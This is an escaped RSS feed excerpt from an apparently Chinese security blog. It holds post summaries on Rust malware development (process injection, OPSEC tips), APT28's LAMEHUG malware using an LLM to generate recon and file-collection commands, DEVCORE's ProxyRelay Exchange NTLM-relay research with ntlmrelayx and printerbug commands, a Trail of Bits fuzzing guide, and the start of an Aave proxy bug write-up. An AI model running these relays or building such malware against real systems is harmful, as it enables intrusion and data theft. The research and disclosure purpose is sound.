class=&#34;n&#34;&gt;unwrap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 注入notepad.exe进程
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;操作安全考虑&#34;&gt;操作安全考虑
&lt;/h2&gt;&lt;p&gt;Rust会在二进制文件中包含绝对路径(用于调试)，因此需在匿名环境中编译以保护操作安全。&lt;/p&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;Rust是C/C++开发恶意软件的优秀替代方案。虽然Ghidra 11.0在反编译Rust二进制文件方面取得进步，但由于函数内联和编译优化，分析Rust程序仍然困难。更大的二进制文件也增加了分析时间成本。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/bishopfox/rust-malware-example&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;完整代码示例可在GitHub获取&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>俄罗斯APT28新型恶意软件利用LLM生成恶意Windows命令</title>
        <link>http://localhost:1313/p/%E4%BF%84%E7%BD%97%E6%96%AFapt28%E6%96%B0%E5%9E%8B%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%A9%E7%94%A8llm%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8Fwindows%E5%91%BD%E4%BB%A4/</link>
        <pubDate>Sat, 02 Aug 2025 21:38:11 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BF%84%E7%BD%97%E6%96%AFapt28%E6%96%B0%E5%9E%8B%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%A9%E7%94%A8llm%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8Fwindows%E5%91%BD%E4%BB%A4/</guid>
        <description>&lt;p&gt;俄罗斯网络间谍组织APT28已开发出通过查询大型语言模型(LLM)生成命令的恶意软件。该恶意软件被乌克兰CERT命名为LAMEHUG，近期被用于针对乌克兰政府实体的鱼叉式钓鱼攻击，成为攻击者利用AI实施攻击的新案例。&lt;/p&gt;
&lt;p&gt;根据CERT-UA报告，钓鱼邮件来自被入侵的邮箱账户，冒充乌克兰某部委代表。恶意软件包含在ZIP压缩包中，使用.pif(MS-DOS可执行文件)扩展名，但也观察到.exe和.py扩展名的变体。&lt;/p&gt;
&lt;p&gt;CERT-UA将这些攻击归因于其追踪为UAC-0001的组织，该组织在安全社区更广为人知的名称是APT28。西方情报机构已正式将该组织与俄罗斯军事情报局GRU的第26165部队(或称第85主要特别服务中心)联系起来。&lt;/p&gt;
&lt;p&gt;APT28(又称Sofacy、Pawn Storm或Fancy Bear)自2004年起就对西方国家目标开展网络行动，在2022年2月俄罗斯入侵乌克兰之前就已在乌频繁活动。去年美国司法部起诉了五名GRU军官和一名涉嫌协助的平民，指控其对乌克兰计算机基础设施实施破坏性网络攻击，并探测包括美国在内的26个北约成员国政府计算机系统。鉴于APT28的全球行动范围，新型LAMEHUG恶意软件很可能不久就会被用于西方目标。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;实时查询LLM API的创新手法&lt;/strong&gt;
此前观察到的攻击者主要使用LLM编写恶意脚本或优化钓鱼邮件内容，网络犯罪论坛上也出售各种未经审查和越狱的LLM订阅服务。但LAMEHUG开发者采取了不同方法，将直接查询LLM的功能内置到恶意程序本身。&lt;/p&gt;
&lt;p&gt;LAMEHUG通过Hugging Face平台(网络最大的LLM和其他AI资产托管平台)的API，向Qwen 2.5-Coder-32B-Instruct模型发送查询指令，要求模型模拟Windows系统管理员生成命令列表：创建文件夹、收集计算机/网络/Active Directory域信息并存入文本文件。另一个独立查询则要求模型生成递归复制Documents、Downloads和Desktop文件夹中所有.pdf和.txt文档到新建的C:\Programdata\info\目录下的命令。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;技术实现细节&lt;/strong&gt;
LAMEHUG采用Python编写，通过PyInstaller将源代码编译为可执行二进制文件。CERT-UA观察到其分发形态包括Appendix.pif、AI_generator_uncensored_Canvas_PRO_v0.9.exe、AI_image_generator_v0.95.exe和image.py等变体，各版本在数据渗出方式上存在功能差异。恶意软件的C2服务器托管在合法但已被入侵的基础设施上。&lt;/p&gt;
&lt;p&gt;正如LLM正成为组织和员工的常用工具，它们对攻击者也同样有用。研究人员近期测试LLM执行漏洞开发和利用任务的能力，发现虽然目前效果不佳但进步迅速。随着时间推移，我们很可能会看到更多AI辅助攻击，甚至高级黑客行为，就像AI辅助编程的兴起一样。通过动态使用LLM生成多样化命令，攻击者可能希望借此引入多态性特征来规避检测签名。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>MS Exchange新攻击面分析第四部：ProxyRelay技术揭秘</title>
        <link>http://localhost:1313/p/ms-exchange%E6%96%B0%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%E7%AC%AC%E5%9B%9B%E9%83%A8proxyrelay%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/</link>
        <pubDate>Sat, 02 Aug 2025 21:26:58 +0800</pubDate>
        
        <guid>http://localhost:1313/p/ms-exchange%E6%96%B0%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%E7%AC%AC%E5%9B%9B%E9%83%A8proxyrelay%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/</guid>
        <description>&lt;h1 id=&#34;ms-exchange新攻击面分析第四部proxyrelay&#34;&gt;MS Exchange新攻击面分析第四部：ProxyRelay！
&lt;/h1&gt;&lt;p&gt;这是来自DEVCORE的交叉发布博客。完整系列包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MS Exchange新攻击面分析第一部：ProxyLogon！&lt;/li&gt;
&lt;li&gt;MS Exchange新攻击面分析第二部：ProxyOracle！&lt;/li&gt;
&lt;li&gt;MS Exchange新攻击面分析第三部：ProxyShell！&lt;/li&gt;
&lt;li&gt;MS Exchange新攻击面分析第四部：ProxyRelay！&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;背景说明&#34;&gt;背景说明
&lt;/h2&gt;&lt;p&gt;这篇迟来的文章原本可以更早发布（原始漏洞于2021年6月报告给MSRC，遵循90天公开披露政策）。在与MSRC沟通期间，他们解释由于这是架构设计问题，需要进行大量代码修改和测试，因此希望通过累积更新(CU)而非常规补丁周二一次性解决。我们理解这一情况并同意延长截止日期。&lt;/p&gt;
&lt;p&gt;微软最终于2022年4月20日发布Exchange Server 2019 CU 12和Exchange Server 2016 CU 23，但该补丁默认未启用。直到2022年8月9日微软才发布补丁激活方法。我们本有机会在Pwn2Own Vancouver 2021展示攻击，但出于安全研究初衷放弃了参赛计划。&lt;/p&gt;
&lt;h2 id=&#34;技术原理&#34;&gt;技术原理
&lt;/h2&gt;&lt;p&gt;自2021年4月微软封堵Proxy系列攻击后，我们一直在探索绕过方案。当时微软通过增强CAS前端认证机制，要求所有需要Kerberos票据的HTTP请求必须先通过认证，有效阻止了未经认证的请求访问CAS后端。但Exchange真的安全了吗？&lt;/p&gt;
&lt;p&gt;我们借鉴了打印机漏洞(Printer Bug)的思路：在Exchange架构中，后端通过检查登录身份是否拥有ms-Exch-EPI-Token-Serialization扩展权限来授权HTTP请求。由于Exchange服务器在安装时会自动加入Exchange Servers组，该组所有对象默认拥有此权限。&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用
&lt;/h2&gt;&lt;p&gt;我们发现了完整的攻击面而非单个漏洞，由此衍生出多个CVE：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2021-33768 - 中继到Exchange前端&lt;/li&gt;
&lt;li&gt;CVE-2022-21979 - 中继到Exchange后端&lt;/li&gt;
&lt;li&gt;CVE-2021-26414 - 中继到Exchange DCOM&lt;/li&gt;
&lt;li&gt;CVE-2022-RESERVED - 中继到其他Exchange服务&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;第一轮中继到exchange前端&#34;&gt;第一轮：中继到Exchange前端
&lt;/h3&gt;&lt;p&gt;通过强制EX01发起SMB连接，使用ntlmrelayx.py将NTLM认证中继到EX02前端的EWS服务。由于中继身份是拥有Token-Serialization权限的机器账户，我们可以模拟任意用户：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 终端1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ python ntlmrelayx.py -smb2support -t https://EX02/EWS/Exchange.asmx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 终端2 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ python printerbug.py EX01 ATTACKER
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;微软通过在前端代理处理程序添加IsSystemOrMachineAccount()检查来修复此问题（CVE-2021-33768）。&lt;/p&gt;
&lt;h3 id=&#34;第二轮中继到exchange后端&#34;&gt;第二轮：中继到Exchange后端
&lt;/h3&gt;&lt;p&gt;后端验证更为复杂，我们展示了三种攻击方式：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;攻击后端/EWS：只需将目标端口从443改为444&lt;/li&gt;
&lt;li&gt;攻击后端/RPC：通过RPC-over-HTTP协议操作邮箱&lt;/li&gt;
&lt;li&gt;攻击后端/PowerShell：实现类似ProxyShell的利用链&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;微软通过强制启用IIS的扩展保护认证修复此问题（CVE-2022-21979）。&lt;/p&gt;
&lt;h3 id=&#34;第三轮中继到windows-dcom&#34;&gt;第三轮：中继到Windows DCOM
&lt;/h3&gt;&lt;p&gt;基于Exchange服务器在AD环境中的组继承特性，EX01$机器账户也是EX02的本地管理员。通过中继到MS-DCOM可以实现RCE。微软分三个阶段逐步修复此问题（CVE-2021-26414）。&lt;/p&gt;
&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;p&gt;详细披露过程包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2021年6月2日：通过MSRC门户报告漏洞&lt;/li&gt;
&lt;li&gt;2022年4月20日：发布Exchange补丁&lt;/li&gt;
&lt;li&gt;2022年8月18日：最终发布CVE和补丁激活文档&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;结语&#34;&gt;结语
&lt;/h2&gt;&lt;p&gt;这个系列研究历时两年，期间经历了漏洞碰撞、Pwn2Own竞赛、顶级会议演讲等事件。我们始终秉持安全研究的初心，希望通过这些发现帮助提升Exchange服务器的安全性。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>以太坊智能合约的可复用属性测试指南</title>
        <link>http://localhost:1313/p/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E5%8F%AF%E5%A4%8D%E7%94%A8%E5%B1%9E%E6%80%A7%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sat, 02 Aug 2025 21:15:46 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E5%8F%AF%E5%A4%8D%E7%94%A8%E5%B1%9E%E6%80%A7%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h3 id=&#34;可复用的以太坊合约属性测试&#34;&gt;可复用的以太坊合约属性测试
&lt;/h3&gt;&lt;p&gt;随着智能合约安全技术的演进，基于属性的模糊测试已成为开发者和安全工程师的核心技术。该技术依赖代码属性（通常称为不变量）的创建，这些属性描述了代码的预期行为。为帮助社区定义属性，我们发布了168个预构建属性集，可用于指导我们的智能合约模糊测试工具Echidna，或直接通过单元测试使用。覆盖范围包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;常见ERC代币接口合规性&lt;/li&gt;
&lt;li&gt;通用可测试安全属性&lt;/li&gt;
&lt;li&gt;定点数学运算测试属性&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;实战直播安排&#34;&gt;实战直播安排
&lt;/h4&gt;&lt;p&gt;为帮助掌握这些工具，我们将举办两场直播：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;3月7日&lt;/strong&gt;：ERC20属性、示例用法和Echidna作弊码（Guillermo Larregay主讲）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;3月14日&lt;/strong&gt;：ERC4626属性、示例用法及高效模糊测试技巧（Benjamin Samuels主讲）&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;为什么需要使用&#34;&gt;为什么需要使用？
&lt;/h3&gt;&lt;p&gt;该资源库及配套研讨会将展示模糊测试如何提供比单元测试更高级别的安全保障。这些属性集可轻松集成到使用知名标准或常用库的项目中，当前包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ABDKMath64x64库&lt;/strong&gt;测试&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ERC-20代币标准&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ERC-4626代币化金库标准&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;核心测试内容&#34;&gt;核心测试内容
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;ERC20&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;标准接口函数属性&lt;/li&gt;
&lt;li&gt;基础合理性属性（如：用户余额不应超过代币供应量）&lt;/li&gt;
&lt;li&gt;可销毁、可铸造、可暂停等扩展功能属性&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;ERC4626&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;符合规范的舍入方向验证&lt;/li&gt;
&lt;li&gt;禁止回退函数的属性&lt;/li&gt;
&lt;li&gt;差分测试属性（如deposit()必须与previewDeposit()预测功能匹配）&lt;/li&gt;
&lt;li&gt;非规范安全属性（份额通胀攻击、代币授权检查等）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;ABDKMath64x64&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;交换律、结合律、分配律和恒等属性&lt;/li&gt;
&lt;li&gt;差分测试属性（如2^(-x) == 1/2^(x)）&lt;/li&gt;
&lt;li&gt;输入范围回退验证&lt;/li&gt;
&lt;li&gt;区间属性（如min(x,y) &amp;lt;= avg(x,y) &amp;lt;= max(x,y)）&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;快速开始指南&#34;&gt;快速开始指南
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;安装Echidna&lt;/li&gt;
&lt;li&gt;导入属性库：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Hardhat项目&lt;/strong&gt;：&lt;code&gt;npm install https://github.com/crytic/properties.git&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Foundry项目&lt;/strong&gt;：&lt;code&gt;forge install crytic/properties&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;按文档创建测试合约&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;erc20测试合约示例&#34;&gt;ERC20测试合约示例
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;pragma solidity&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;./YetAnotherCashEquivalentToken.sol&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ICryticTokenMock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;@crytic/properties/contracts/ERC20/external/util/ITokenMock.sol&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;contract&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;CryticERC20ExternalHarness&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CryticERC20ExternalBasicProperties&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;constructor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;token&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ICryticTokenMock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CryticTokenMock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;echidna配置文件&#34;&gt;Echidna配置文件
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;corpusDir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;tests/erc20/echidna-corpus&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;testMode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;assertion&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;testLimit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;100000&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;sender&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0x10000&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0x20000&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0x30000&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;运行命令：&lt;code&gt;echidna-test . --contract CryticERC20ExternalHarness --config echidna.yaml&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;未来计划&#34;&gt;未来计划
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;扩展数学库测试（如PRBMath）&lt;/li&gt;
&lt;li&gt;增加更多ERC标准测试&lt;/li&gt;
&lt;li&gt;构建AMM/流动性池等通用合约测试集&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;本文档所有技术内容均基于Trail of Bits官方发布材料，无AI虚构内容。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>揭秘Aave可升级合约漏洞 - 代理模式下的致命缺陷</title>
        <link>http://localhost:1313/p/%E6%8F%AD%E7%A7%98aave%E5%8F%AF%E5%8D%87%E7%BA%A7%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E-%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E8%87%B4%E5%91%BD%E7%BC%BA%E9%99%B7/</link>
        <pubDate>Sat, 02 Aug 2025 21:04:25 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%8F%AD%E7%A7%98aave%E5%8F%AF%E5%8D%87%E7%BA%A7%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E-%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E8%87%B4%E5%91%BD%E7%BC%BA%E9%99%B7/</guid>
        <description>&lt;h1 id=&#34;breaking-aave-upgradeability&#34;&gt;Breaking Aave Upgradeability
&lt;/h1&gt;&lt;p&gt;2020年12月3日，Aave部署了其代码库的V2版本。虽然我们未被雇佣进行代码审计，但在次日我们对其进行了简要检查。我们迅速发现了一个同时影响V1和V2线上合约的漏洞并立即报告。Aave团队在收到分析报告后一小时内就修复了该漏洞。若被利用，该漏洞将摧毁Aave系统并影响外部DeFi合约中的资金。&lt;/p&gt;
&lt;p&gt;尽管有五家安全公司（包括使用形式化验证的机构）审计过Aave代码库，但此漏洞仍被遗漏。本文将详述该漏洞原理、为何未被发现以及经验教训。同时我们开源了新的Slither检测器以提升以太坊生态安全性。&lt;/p&gt;
&lt;h2 id=&#34;漏洞原理&#34;&gt;漏洞原理
&lt;/h2&gt;&lt;p&gt;Aave使用了我们此前多次讨论的delegatecall代理模式。该模式将组件分为：1)包含实现逻辑的逻辑合约；2)包含数据并通过delegatecall与逻辑合约交互的代理合约。用户与代理合约交互，而代码在逻辑合约执行。以下是简化示意图：&lt;/p&gt;
&lt;p&gt;在Aave中，LendingPool(LendingPool.sol)是采用delegatecall代理的可升级组件。该漏洞依赖两个关键特性：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;逻辑合约的函数（包括初始化函数）可直接调用&lt;/li&gt;
&lt;li&gt;借贷池自身具有delegatecall能力&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;可升级合约初始化&#34;&gt;可升级合约初始化
&lt;/h2&gt;&lt;p&gt;这种升级模式的限制在于代理合约无法依赖逻辑合约的构造函数进行初始化。因此状态变量和初始设置必须在公开的初始化函数中完成，这些函数无法享受构造函数的保护机制。&lt;/p&gt;
&lt;p&gt;在LendingPool中，initialize函数设置provider地址(_addressesProvider)：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
